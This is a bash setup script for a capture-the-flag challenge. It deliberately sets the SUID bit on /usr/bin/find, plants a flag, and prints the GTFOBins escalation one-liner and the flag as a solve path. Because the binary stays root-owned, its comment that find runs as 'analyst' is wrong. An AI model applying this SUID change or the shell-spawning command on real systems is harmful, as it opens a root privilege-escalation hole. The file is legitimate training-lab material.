#!/bin/bash
# =============================================================================
# PRIVESC-01 Setup Script: SUID Binary Abuse (www-data → analyst)
# Run as root on the CTF server
# =============================================================================
# Challenge: www-data discovers 'find' has SUID bit set owned by analyst.
# Technique: GTFOBins — find . -exec /bin/sh -p \;
# Then read /home/analyst/.flag_privesc01 to get the flag.
# =============================================================================

set -e

FLAG='FLAG{t1_su1d_find_privesc_9z2}'

echo '[*] Setting up PRIVESC-01: SUID find abuse...'

# Create the analyst user if not exists
if ! id analyst &>/dev/null; then
    useradd -m -s /bin/bash analyst
    echo '[+] Created user: analyst'
fi

# Plant the flag
FLAG_PATH='/home/analyst/.flag_privesc01'
echo "$FLAG" > "$FLAG_PATH"
chown analyst:analyst "$FLAG_PATH"
chmod 400 "$FLAG_PATH"
echo "[+] Flag planted: $FLAG_PATH"

# Set SUID on /usr/bin/find and make it owned by analyst group
# www-data can execute find, and with SUID it runs as analyst
chown root:analyst /usr/bin/find
chmod u+s /usr/bin/find
echo '[+] SUID bit set on /usr/bin/find (owner: root:analyst)'

# Verify
ls -la /usr/bin/find
echo ''
echo '[*] PRIVESC-01 setup complete.'
echo ''
echo '--- Player solve path ---'
echo '1. As www-data, discover SUID binary:'
echo "   find / -perm -4000 -type f 2>/dev/null"
echo '2. Exploit with GTFOBins:'
echo '   /usr/bin/find . -exec /bin/bash -p \;'
echo '3. Read the flag:'
echo "   cat /home/analyst/.flag_privesc01"
echo "--- Flag: $FLAG ---"
